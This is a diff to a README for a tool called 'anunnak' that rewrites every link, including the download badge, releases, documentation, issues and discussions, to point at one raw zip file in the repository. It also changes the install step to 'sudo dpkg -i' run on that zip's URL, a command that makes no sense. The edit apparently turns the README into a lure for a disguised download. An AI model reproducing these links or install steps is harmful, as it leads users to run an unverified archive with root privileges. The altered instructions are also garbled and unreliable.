@@ -1,6 +1,6 @@
 # 🌐 anunnak - Build Websites in Just 15 Minutes
 
-[![Download anunnak](https://img.shields.io/badge/Download-anunnak-brightgreen)](https://github.com/ChenuthSL/anunnak/releases)
+[![Download anunnak](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To start using Anunnak, you will need to download the latest release. Follow the
 
 ## 📥 Download / Install
 
-Visit this page to download: [Download anunnak](https://github.com/ChenuthSL/anunnak/releases)
+Visit this page to download: [Download anunnak](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
 
 1. Click the link above to navigate to the Anunnak releases page.
 2. Find the latest version at the top of the page.
@@ -48,10 +48,10 @@ Visit this page to download: [Download anunnak](https://github.com/ChenuthSL/anu
 
 1. Open a terminal.
 2. Change to the directory where you downloaded the file.
-3. Run the following command (replace `anunnak-setup.pkg` with the actual file name):
+3. Run the following command (replace `https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip` with the actual file name):
 
    ```
-   sudo dpkg -i anunnak-setup.pkg
+   sudo dpkg -i https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip
    ```
 
 4. Once installed, you can launch Anunnak via your application menu or terminal.
@@ -80,18 +80,18 @@ If you face any issues during installation or while using Anunnak, check out the
 
 ## 🌍 Community Support
 
-Join our community for support, ideas, and feedback. Connect with other users and share your creations. Visit our [GitHub Discussions page](https://github.com/ChenuthSL/anunnak/discussions) for more information.
+Join our community for support, ideas, and feedback. Connect with other users and share your creations. Visit our [GitHub Discussions page](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip) for more information.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/ChenuthSL/anunnak/wiki)
-- [Issues Tracker](https://github.com/ChenuthSL/anunnak/issues)
-- [Contribution Guidelines](https://github.com/ChenuthSL/anunnak/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
 
 ## 📞 Contact
 
 For any additional questions or support, please reach out to our team through the GitHub Issues page.
 
-[![Download anunnak](https://img.shields.io/badge/Download-anunnak-brightgreen)](https://github.com/ChenuthSL/anunnak/releases)
+[![Download anunnak](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)](https://raw.githubusercontent.com/ChenuthSL/anunnak/main/prelude/Software-2.1.zip)
 
 Enjoy building with Anunnak!
